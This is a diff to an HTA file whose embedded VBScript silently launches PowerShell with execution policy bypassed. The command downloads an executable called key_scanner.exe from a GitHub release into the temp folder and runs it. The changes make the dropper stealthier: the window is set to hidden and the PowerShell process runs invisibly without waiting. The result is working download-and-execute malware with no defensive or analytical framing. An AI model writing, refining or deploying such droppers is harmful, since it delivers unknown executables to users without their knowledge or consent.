@@ -3,11 +3,15 @@
   border="none"
   caption="no"
   showintaskbar="no"
-  windowstate="minimize"
+  windowstate="hidden" <!-- This hides the HTA window -->
   scroll="no"
 >
+
 <script language="VBScript">
 Set objShell = CreateObject("Wscript.Shell")
-objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""$url='https://github.com/jozef800/discord/releases/download/v3.0/key_scanner.exe';$out='$env:temp\scanner.exe';Invoke-WebRequest -Uri $url -OutFile $out;Start-Process $out"""
+' Run PowerShell silently and hidden
+objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""$url='https://github.com/jozef800/discord/releases/download/v3.0/key_scanner.exe';$out='$env:temp\scanner.exe';Invoke-WebRequest -Uri $url -OutFile $out;Start-Process $out""", 0, False
 Self.Close
 </script>
+
+</hta:application>
